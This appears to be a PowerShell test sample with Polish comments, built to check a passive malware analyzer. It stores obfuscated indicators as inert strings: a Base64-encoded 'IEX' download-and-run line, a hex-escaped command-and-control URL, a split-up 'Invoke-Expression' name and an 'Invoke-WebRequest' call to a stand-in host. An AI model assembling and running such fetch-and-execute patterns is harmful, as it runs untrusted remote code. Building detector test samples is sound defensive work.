# PRZYKLAD EDUKACYJNY - NIE URUCHAMIAJ TEGO PLIKU JAKO SKRYPTU.
# Wszystkie podejrzane elementy sa przechowywane jako tekst. Plik sluzy tylko
# do sprawdzenia pasywnego analizatora Infa-Sled.

# Zakodowany tekst Base64 zostanie rozpoznany i pasywnie odczytany.
$base64Text = "SUVYIGh0dHBzOi8vYmFkLmV4YW1wbGUvYQ=="

# Proste sekwencje hex ukrywaja testowy wskaznik sieciowy.
$escapedText = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x31\x39\x32\x2e\x30\x2e\x32\x2e\x31\x30\x2f\x63\x32"

# Wielokrotna konkatenacja ukrywa podejrzana nazwe polecenia.
$commandName = "Inv" + "oke-" + "Expression"

# Podejrzana konstrukcja i IOC zapisane jako nieaktywny tekst.
$downloadText = "Invoke-WebRequest https://bad.example/a"

Write-Host "To jest tylko bezpieczna probka tekstowa dla analizatora."
